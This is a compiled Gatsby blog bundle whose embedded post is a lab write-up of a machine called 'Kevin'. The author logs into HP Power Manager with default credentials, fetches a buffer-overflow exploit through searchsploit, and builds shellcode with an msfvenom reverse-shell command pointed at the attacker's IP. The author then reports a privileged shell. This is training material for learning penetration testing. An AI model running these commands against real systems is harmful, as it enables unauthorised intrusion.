"use strict";
exports.id = 819;
exports.ids = [819];
exports.modules = {

/***/ 4765:
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {


// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  F: () => (/* reexport */ Head),
  Z: () => (/* binding */ MinimalBlogCorePost)
});

// EXTERNAL MODULE: external "/Users/rajkhandekar/Documents/blog/blog2/node_modules/react/index.js"
var index_js_ = __webpack_require__(7184);
// EXTERNAL MODULE: ./node_modules/theme-ui/dist/theme-ui.esm.js
var theme_ui_esm = __webpack_require__(8733);
// EXTERNAL MODULE: ./node_modules/@theme-ui/components/dist/theme-ui-components.esm.js
var theme_ui_components_esm = __webpack_require__(795);
// EXTERNAL MODULE: ./node_modules/@lekoarts/gatsby-theme-minimal-blog/src/components/layout.tsx + 12 modules
var layout = __webpack_require__(8377);
// EXTERNAL MODULE: ./node_modules/@lekoarts/gatsby-theme-minimal-blog/src/components/item-tags.tsx
var item_tags = __webpack_require__(6799);
// EXTERNAL MODULE: ./node_modules/@lekoarts/gatsby-theme-minimal-blog/src/components/seo.tsx
var seo = __webpack_require__(8871);
;// CONCATENATED MODULE: ./node_modules/@lekoarts/gatsby-theme-minimal-blog/src/components/post-footer.tsx
/* eslint-disable @typescript-eslint/no-unused-vars */const PostFooter=({post})=>null;/* harmony default export */ const post_footer = (PostFooter);
;// CONCATENATED MODULE: ./node_modules/@lekoarts/gatsby-theme-minimal-blog/src/components/post.tsx
/** @jsx jsx */const px=[`16px`,`8px`,`4px`];const shadow=px.map(v=>`rgba(0, 0, 0, 0.1) 0px ${v} ${v} 0px`);const Post=({data:{post},children})=>(0,theme_ui_esm/* jsx */.tZ)(layout/* default */.Z,null,(0,theme_ui_esm/* jsx */.tZ)(theme_ui_components_esm/* Heading */.X6,{as:"h1",variant:"styles.h1"},post.title),(0,theme_ui_esm/* jsx */.tZ)("p",{sx:{color:`secondary`,mt:3,a:{color:`secondary`},fontSize:[1,1,2]}},(0,theme_ui_esm/* jsx */.tZ)("time",null,post.date),post.tags&&(0,theme_ui_esm/* jsx */.tZ)(index_js_.Fragment,null,` — `,(0,theme_ui_esm/* jsx */.tZ)(item_tags/* default */.Z,{tags:post.tags})),post.timeToRead&&` — `,post.timeToRead&&(0,theme_ui_esm/* jsx */.tZ)("span",null,post.timeToRead," min read")),(0,theme_ui_esm/* jsx */.tZ)("section",{sx:{my:5,".gatsby-resp-image-wrapper":{my:[4,4,5],borderRadius:`4px`,boxShadow:shadow.join(`, `),".gatsby-resp-image-image":{borderRadius:`4px`}},variant:`layout.content`}},children),(0,theme_ui_esm/* jsx */.tZ)(post_footer,{post:post}));/* harmony default export */ const post = (Post);const Head=({data:{post}})=>{var _post$banner,_post$banner$childIma,_post$banner$childIma2;return (0,theme_ui_esm/* jsx */.tZ)(seo/* default */.Z,{title:post.title,description:post.description?post.description:post.excerpt,image:post.banner?(_post$banner=post.banner)===null||_post$banner===void 0?void 0:(_post$banner$childIma=_post$banner.childImageSharp)===null||_post$banner$childIma===void 0?void 0:(_post$banner$childIma2=_post$banner$childIma.resize)===null||_post$banner$childIma2===void 0?void 0:_post$banner$childIma2.src:undefined,pathname:post.slug,canonicalUrl:post.canonicalUrl});};
;// CONCATENATED MODULE: ./node_modules/@lekoarts/gatsby-theme-minimal-blog/src/@lekoarts/gatsby-theme-minimal-blog-core/components/post.tsx
function MinimalBlogCorePost({...props}){return/*#__PURE__*/index_js_.createElement(post,props);}

/***/ }),

/***/ 6799:
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   Z: () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony import */ var theme_ui__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(8733);
/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(7184);
/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(react__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var gatsby__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(7076);
/* harmony import */ var _hooks_use_minimal_blog_config__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(3494);
/* harmony import */ var _utils_replaceSlashes__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(3784);
/** @jsx jsx */const ItemTags=({tags})=>{const{tagsPath,basePath}=(0,_hooks_use_minimal_blog_config__WEBPACK_IMPORTED_MODULE_2__/* ["default"] */ .Z)();return (0,theme_ui__WEBPACK_IMPORTED_MODULE_3__/* .jsx */ .tZ)(react__WEBPACK_IMPORTED_MODULE_0__.Fragment,null,tags.map((tag,i)=>(0,theme_ui__WEBPACK_IMPORTED_MODULE_3__/* .jsx */ .tZ)(react__WEBPACK_IMPORTED_MODULE_0__.Fragment,{key:tag.slug},!!i&&`, `,(0,theme_ui__WEBPACK_IMPORTED_MODULE_3__/* .jsx */ .tZ)(gatsby__WEBPACK_IMPORTED_MODULE_1__.Link,{sx:t=>{var _t$styles;return{...((_t$styles=t.styles)===null||_t$styles===void 0?void 0:_t$styles.a)};},to:(0,_utils_replaceSlashes__WEBPACK_IMPORTED_MODULE_4__/* ["default"] */ .Z)(`/${basePath}/${tagsPath}/${tag.slug}`)},tag.name))));};/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = (ItemTags);

/***/ }),

/***/ 8871:
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   Z: () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(7184);
/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(react__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var gatsby__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(7076);
/* harmony import */ var _hooks_use_site_metadata__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(4232);
const Seo=({title=``,description=``,pathname=``,image=``,children=null,canonicalUrl=``})=>{const site=(0,_hooks_use_site_metadata__WEBPACK_IMPORTED_MODULE_2__/* ["default"] */ .Z)();const{siteTitle,siteTitleAlt:defaultTitle,siteUrl,siteDescription:defaultDescription,siteImage:defaultImage,author,siteLanguage}=site;const seo={title:title?`${title} | ${siteTitle}`:defaultTitle,description:description||defaultDescription,url:`${siteUrl}${pathname||``}`,image:`${siteUrl}${image||defaultImage}`};return/*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0__.createElement(react__WEBPACK_IMPORTED_MODULE_0__.Fragment,null,/*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0__.createElement("html",{lang:siteLanguage}),/*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0__.createElement("title",null,seo.title),/*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0__.createElement("meta",{name:"description",content:seo.description}),/*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0__.createElement("meta",{name:"image",content:seo.image}),/*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0__.createElement("meta",{property:"og:title",content:seo.title}),/*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0__.createElement("meta",{property:"og:url",content:seo.url}),/*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0__.createElement("meta",{property:"og:description",content:seo.description}),/*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0__.createElement("meta",{property:"og:image",content:seo.image}),/*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0__.createElement("meta",{property:"og:type",content:"website"}),/*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0__.createElement("meta",{property:"og:image:alt",content:seo.description}),/*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0__.createElement("meta",{name:"twitter:card",content:"summary_large_image"}),/*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0__.createElement("meta",{name:"twitter:title",content:seo.title}),/*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0__.createElement("meta",{name:"twitter:url",content:seo.url}),/*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0__.createElement("meta",{name:"twitter:description",content:seo.description}),/*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0__.createElement("meta",{name:"twitter:image",content:seo.image}),/*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0__.createElement("meta",{name:"twitter:image:alt",content:seo.description}),/*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0__.createElement("meta",{name:"twitter:creator",content:author}),/*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0__.createElement("meta",{name:"gatsby-theme",content:"@lekoarts/gatsby-theme-minimal-blog"}),/*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0__.createElement("link",{rel:"icon",type:"image/png",sizes:"32x32",href:(0,gatsby__WEBPACK_IMPORTED_MODULE_1__.withPrefix)(`/favicon-32x32.png`)}),/*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0__.createElement("link",{rel:"icon",type:"image/png",sizes:"16x16",href:(0,gatsby__WEBPACK_IMPORTED_MODULE_1__.withPrefix)(`/favicon-16x16.png`)}),/*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0__.createElement("link",{rel:"apple-touch-icon",sizes:"180x180",href:(0,gatsby__WEBPACK_IMPORTED_MODULE_1__.withPrefix)(`/apple-touch-icon.png`)}),canonicalUrl?/*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0__.createElement("link",{rel:"canonical",href:canonicalUrl}):null,children);};/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = (Seo);

/***/ }),

/***/ 6610:
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

// ESM COMPAT FLAG
__webpack_require__.r(__webpack_exports__);

// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  Head: () => (/* reexport */ post/* Head */.F),
  "default": () => (/* binding */ GatsbyMDXWrapper)
});

// EXTERNAL MODULE: external "/Users/rajkhandekar/Documents/blog/blog2/node_modules/react/index.js"
var index_js_ = __webpack_require__(7184);
var index_js_default = /*#__PURE__*/__webpack_require__.n(index_js_);
// EXTERNAL MODULE: ./node_modules/@mdx-js/react/lib/index.js
var lib = __webpack_require__(1151);
;// CONCATENATED MODULE: ./content/posts/kevin/index.mdx
/*@jsxRuntime classic @jsx React.createElement @jsxFrag React.Fragment*/function _createMdxContent(props){const _components=Object.assign({h1:"h1",h2:"h2",pre:"pre",code:"code",span:"span",p:"p",h3:"h3",ul:"ul",li:"li",strong:"strong",a:"a",hr:"hr"},(0,lib/* useMDXComponents */.ah)(),props.components);return/*#__PURE__*/index_js_default().createElement((index_js_default()).Fragment,null,/*#__PURE__*/index_js_default().createElement(_components.h1,null,"Recon"),"\n",/*#__PURE__*/index_js_default().createElement(_components.h2,null,"NmapAutomator"),"\n",/*#__PURE__*/index_js_default().createElement(_components.pre,null,/*#__PURE__*/index_js_default().createElement(_components.code,null,"nmapAutomator.sh --host 192.168.152.45 -t basic\n")),"\n",/*#__PURE__*/index_js_default().createElement(_components.span,{dangerouslySetInnerHTML:{__html:"<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 926px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 59.166666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAABzklEQVR42o2S6W6jQBCE/SorJyaxDZjhxhzDfRsf2kTa93+P2u6xHOVP1vuj1TCCb6q6azXkHQI7Rku9LwckXgahu/CsEHM7o0xqHN0EvunD2Nl43brY/KNWo2zQ1jMq2aElYCV7TN2CNCogDB+uFcERRwV0dgK/NBubdwev3+rljS6iUsCFfu6rEWM94TxcqM+IgwwRqfq9fGBsTvg4f+I23SCTBqadYmdG2BrhV9etGPvD8Q5Myxlh2iPKerjHGrEcYfkF9iKBHZbQqYuggOlKCDoXnoRBZ4aI6TlTz7afw3KzO/DgpKjaCySBo6SFRe863bbVA6w1oay8UGdb3+thlWut3bsCMnm5/sEwk73lE01/RZqPys6aP3p3oe08aPSx9mQhCmjaCdrhhrw+Ia9OZHnAMe3UbNgWd1az+Q+YAjo0HwZkxYSIO1mvSWXZnhHEDd72vrL+sPkUyKCC1FXdRSmUVAlZLpszvc8QtAyfluWFFUxawFMgQypSw3PjxfAIeMj7Q6TmyRfyfGu60KB4PFO5Yot5vSjbMYWaM8VA3nJB5zzTursq9Vsj+Nrmj8CY8sfqGMjlUPY4WzzbR5RkOSEtRpU3ziG7+EnpX/f7idP9ww9kAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"nmap\"\n        title=\"\"\n        src=\"/static/ab8b756b30d84197e935797423844332/96b7d/nmap.png\"\n        srcset=\"/static/ab8b756b30d84197e935797423844332/5243c/nmap.png 240w,\n/static/ab8b756b30d84197e935797423844332/ab158/nmap.png 480w,\n/static/ab8b756b30d84197e935797423844332/96b7d/nmap.png 926w\"\n        sizes=\"(max-width: 926px) 100vw, 926px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span>"}}),"\n",/*#__PURE__*/index_js_default().createElement(_components.p,null,"The basic nmapAutomator scan shows a HTTP port. This will be the first port that I will assess."),"\n",/*#__PURE__*/index_js_default().createElement(_components.h3,null,"HTTP - Port 80"),"\n",/*#__PURE__*/index_js_default().createElement(_components.p,null,"We are presented a login page for HP Power Manager"),"\n",/*#__PURE__*/index_js_default().createElement(_components.ul,null,"\n",/*#__PURE__*/index_js_default().createElement(_components.li,null,"searching for default credentials shows ",/*#__PURE__*/index_js_default().createElement(_components.code,null,"admin:admin"),"\n",/*#__PURE__*/index_js_default().createElement(_components.span,{dangerouslySetInnerHTML:{__html:"<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 748px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.08333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABH0lEQVR42l2Ry3KDMAxF+Y2mmBAefgKGACEYAu100VX+/3NuZZNpZ7q4cySNfWXJke17uG3DfV3hHluI3bZj2T8wLStk3UA1FupFnxvborleYccJDcneZ2RC4y1OEJVCQZoKnkIbcFIpj1ohJEqlD1LNk7/y/8y5QJoXiAQVKuqclxyGuksy9LEiwwtRU614NfMXdVX/kUyMv0tUlPumkXfNipKK/CCZZKSC8jS9IGYJGGOBJ3bGKfZMaDwWcj9mfL4EMTofcWXQ0x768farth/wNQ74nkcs1wGDe2K57bB1Bd20qGiHtutRE01tySgL5u9J6kc2cOsjaKOPWOlDJrdim2c8P3e4rkOjLWp5rCLn8tgpraGgOC9FeJ0384Y/rD+zr61o/3IAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"def-creds\"\n        title=\"\"\n        src=\"/static/cca3924c4b9cd7c70752a94f0736b5d5/5a032/def-creds.png\"\n        srcset=\"/static/cca3924c4b9cd7c70752a94f0736b5d5/5243c/def-creds.png 240w,\n/static/cca3924c4b9cd7c70752a94f0736b5d5/ab158/def-creds.png 480w,\n/static/cca3924c4b9cd7c70752a94f0736b5d5/5a032/def-creds.png 748w\"\n        sizes=\"(max-width: 748px) 100vw, 748px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span>"}})),"\n"),"\n",/*#__PURE__*/index_js_default().createElement(_components.p,null,"The credentials allows successful login"),"\n",/*#__PURE__*/index_js_default().createElement(_components.ul,null,"\n",/*#__PURE__*/index_js_default().createElement(_components.li,null,"the ",/*#__PURE__*/index_js_default().createElement(_components.strong,null,"Help")," page shows ",/*#__PURE__*/index_js_default().createElement(_components.strong,null,"HP Power Manager 4.2 (Build 7)")),"\n",/*#__PURE__*/index_js_default().createElement(_components.li,null,"using this information, I searched for valid exploits in the exploitdb database which presented a buffer overflow vulnerability"),"\n"),"\n",/*#__PURE__*/index_js_default().createElement(_components.pre,null,/*#__PURE__*/index_js_default().createElement(_components.code,null,"searchsploit hp power manager \n")),"\n",/*#__PURE__*/index_js_default().createElement(_components.span,{dangerouslySetInnerHTML:{__html:"<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAArklEQVR42j2OS24CMRAF5zpgPP7Mz9jYmQkJkMAC0IDY5P7HqLRAYlHq1nsq6VU2HbD5h26Y6MIntS/UJqJ8RjWFlVwtmXKJheQLk1jaF0qw7fjq/QYlfTWXL+4f3zzswJ9pucp/Ey6hcMtbzrsTv+OebRzJTSS3iWB6+rojijPvjszHMwdxlOqoSpiYhL4f8TbiXMQ2GW/WT5xP6DrI6vUbrYc3VpY7WWfEXerAPzKhY4t45ihQAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"searchsploit\"\n        title=\"\"\n        src=\"/static/a93059885fe53c470d44f25251f4ca93/7d769/searchsploit.png\"\n        srcset=\"/static/a93059885fe53c470d44f25251f4ca93/5243c/searchsploit.png 240w,\n/static/a93059885fe53c470d44f25251f4ca93/ab158/searchsploit.png 480w,\n/static/a93059885fe53c470d44f25251f4ca93/7d769/searchsploit.png 960w,\n/static/a93059885fe53c470d44f25251f4ca93/87339/searchsploit.png 1440w,\n/static/a93059885fe53c470d44f25251f4ca93/8128f/searchsploit.png 1482w\"\n        sizes=\"(max-width: 960px) 100vw, 960px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span>"}}),"\n",/*#__PURE__*/index_js_default().createElement(_components.p,null,"The python script for universal buffer overflow looked the most promising so I downloaded the python script using ",/*#__PURE__*/index_js_default().createElement(_components.code,null,"searchsploit -m windows/remote/10099.py")),"\n",/*#__PURE__*/index_js_default().createElement(_components.h1,null,"Exploitation"),"\n",/*#__PURE__*/index_js_default().createElement(_components.p,null,"Script states that we need to replace the shellcode, and gives us a list of bad characters to avoid"),"\n",/*#__PURE__*/index_js_default().createElement(_components.ul,null,"\n",/*#__PURE__*/index_js_default().createElement(_components.li,null,"use the flag ",/*#__PURE__*/index_js_default().createElement(_components.code,null,"-b")," for bad characters that msfvenom will avoid"),"\n",/*#__PURE__*/index_js_default().createElement(_components.li,null,"the script also states that it is using msf encoder PexAlphaNum, with further research this leads me to this ",/*#__PURE__*/index_js_default().createElement(_components.a,{href:"https://www.offsec.com/metasploit-unleashed/alphanumeric-shellcode/"},"offensive security website")," which uses ",/*#__PURE__*/index_js_default().createElement(_components.code,null,"x86/alpha_mixed")),"\n"),"\n",/*#__PURE__*/index_js_default().createElement(_components.pre,null,/*#__PURE__*/index_js_default().createElement(_components.code,null,"msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.230 LPORT=4444 -f c -b \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\\x3d\\x3b\\x2d\\x2c\\x2e\\x24\\x25\\x1a\" -e x86/alpha_mixed\n")),"\n",/*#__PURE__*/index_js_default().createElement(_components.p,null,"Copy the shellcode string contents into the script right after ",/*#__PURE__*/index_js_default().createElement(_components.code,null,"n00bn00b")," and run the script using python2"),"\n",/*#__PURE__*/index_js_default().createElement(_components.pre,null,/*#__PURE__*/index_js_default().createElement(_components.code,null,"python2 10099.py 192.168.152.45\n")),"\n",/*#__PURE__*/index_js_default().createElement(_components.span,{dangerouslySetInnerHTML:{__html:"<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 710px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.25%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAxUlEQVR42m2P2w6CMBBE/Rg1giBCW0AboNyUQMXEeIv//x/jtkbigw+T2d3sns3MolwjLDSYOmE4PzBeXuiGG/T5if50x7G/IpEN4n0DlpQIRUFeWRdpBS+UWDgcS1dYzVSloWqNuh0h8w6Z6lE2I+JdDU4HBhLFJRw/hbvZwSVfGyf5BHP8ZIJZYCoPdNxYUCpbuMFneeUl9vOCluYrRuKf3kpM9S/MAgOWgcUKW57bGBHVZmb6LS8QkkzcSKgp8j/QF/gGdLSCrjiU3BgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"runpy\"\n        title=\"\"\n        src=\"/static/d53796bc69400e040915e44ffdff252e/6f406/runpy.png\"\n        srcset=\"/static/d53796bc69400e040915e44ffdff252e/5243c/runpy.png 240w,\n/static/d53796bc69400e040915e44ffdff252e/ab158/runpy.png 480w,\n/static/d53796bc69400e040915e44ffdff252e/6f406/runpy.png 710w\"\n        sizes=\"(max-width: 710px) 100vw, 710px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span>"}}),"\n","\n","\n",/*#__PURE__*/index_js_default().createElement(_components.span,{dangerouslySetInnerHTML:{__html:"<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 725px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25.416666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAy0lEQVR42oWP5w6CQBCEeRgLSJF+Aod4FCmiJvr+zzIuS2KLiT8mO3u5+TKrufkAoc7wZQ1ZjZBFDz8+wHIz6JbA2hSwvYx3w95h4yQswxYwt/NcGiFWm4ilKYK0/Q2FOqHpbmjIV8crVHNBtu9wHO4oaQ93JStO69kLxd7xJBbvwECUSCk4fYqSCmneIiFNPqBQIlt4UcGtbApPb46f8xXTfG/HQJE1KMqRgUGsnmA33GOhBx+B7/AvaYJq54eBQC/Y2oxJ0d/wL+AD+w+iI9rbHFsAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"root\"\n        title=\"\"\n        src=\"/static/b7ff17ba51129852cf904ed77e2a55e5/bf337/root.png\"\n        srcset=\"/static/b7ff17ba51129852cf904ed77e2a55e5/5243c/root.png 240w,\n/static/b7ff17ba51129852cf904ed77e2a55e5/ab158/root.png 480w,\n/static/b7ff17ba51129852cf904ed77e2a55e5/bf337/root.png 725w\"\n        sizes=\"(max-width: 725px) 100vw, 725px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span>"}}),"\n",/*#__PURE__*/index_js_default().createElement(_components.p,null,"The script successfully generated a privileged reverse shell. The flag is on the desktop of the administrator user."),"\n",/*#__PURE__*/index_js_default().createElement(_components.h1,null,"Summary"),"\n",/*#__PURE__*/index_js_default().createElement(_components.p,null,"Reconnaissance:"),"\n",/*#__PURE__*/index_js_default().createElement(_components.ul,null,"\n",/*#__PURE__*/index_js_default().createElement(_components.li,null,"Utilized NmapAutomator to perform a basic scan on the target host (192.168.152.45), revealing an open HTTP port as the initial point of assessment"),"\n"),"\n",/*#__PURE__*/index_js_default().createElement(_components.p,null,"HTTP Service (Port 80):"),"\n",/*#__PURE__*/index_js_default().createElement(_components.ul,null,"\n",/*#__PURE__*/index_js_default().createElement(_components.li,null,"Discovered a login page for HP Power Manager upon accessing the HTTP service"),"\n",/*#__PURE__*/index_js_default().createElement(_components.li,null,"Identified default credentials (admin:admin) for successful login"),"\n",/*#__PURE__*/index_js_default().createElement(_components.li,null,"Found the version information (HP Power Manager 4.2 Build 7) and searched for exploits in the exploitdb database, revealing a buffer overflow vulnerability"),"\n"),"\n",/*#__PURE__*/index_js_default().createElement(_components.p,null,"Exploitation:"),"\n",/*#__PURE__*/index_js_default().createElement(_components.ul,null,"\n",/*#__PURE__*/index_js_default().createElement(_components.li,null,"Downloaded a promising Python script (10099.py) for the identified vulnerability"),"\n",/*#__PURE__*/index_js_default().createElement(_components.li,null,"Replaced the shellcode in the script and avoided bad characters using msfvenom with the -b flag"),"\n",/*#__PURE__*/index_js_default().createElement(_components.li,null,"Identified the use of the x86/alpha_mixed encoder and generated shellcode accordingly"),"\n",/*#__PURE__*/index_js_default().createElement(_components.li,null,"Executed the modified Python script to exploit the vulnerability, resulting in a privileged reverse shell"),"\n"),"\n",/*#__PURE__*/index_js_default().createElement(_components.p,null,"Post-Exploitation:"),"\n",/*#__PURE__*/index_js_default().createElement(_components.ul,null,"\n",/*#__PURE__*/index_js_default().createElement(_components.li,null,"Obtained root access via the successful execution of the exploit script"),"\n",/*#__PURE__*/index_js_default().createElement(_components.li,null,"Located the flag on the desktop of the administrator user"),"\n"),"\n",/*#__PURE__*/index_js_default().createElement(_components.hr),"\n",/*#__PURE__*/index_js_default().createElement(_components.p,null,"Join me for the next machine soon for more exciting challenges and security insights!"),"\n",/*#__PURE__*/index_js_default().createElement(_components.p,null,"+10 points"));}function MDXContent(props={}){const{wrapper:MDXLayout}=Object.assign({},(0,lib/* useMDXComponents */.ah)(),props.components);return MDXLayout?/*#__PURE__*/index_js_default().createElement(MDXLayout,props,/*#__PURE__*/index_js_default().createElement(_createMdxContent,props)):_createMdxContent(props);}/* harmony default export */ const kevin = (MDXContent);
// EXTERNAL MODULE: ./node_modules/@lekoarts/gatsby-theme-minimal-blog/src/@lekoarts/gatsby-theme-minimal-blog-core/components/post.tsx + 2 modules
var post = __webpack_require__(4765);
;// CONCATENATED MODULE: ./node_modules/@lekoarts/gatsby-theme-minimal-blog-core/src/templates/post-query.tsx?__contentFilePath=/Users/rajkhandekar/Documents/blog/blog2/content/posts/kevin/index.mdx



post/* default */.Z;
function GatsbyMDXWrapper(props) {
  return /*#__PURE__*/index_js_default().createElement(post/* default */.Z, props, /*#__PURE__*/index_js_default().createElement(kevin, props));
}

const query = "2040642971";

/***/ })

};
;
//# sourceMappingURL=component---node-modules-lekoarts-gatsby-theme-minimal-blog-core-src-templates-post-query-tsx-content-file-path-content-posts-kevin-index-mdx.js.map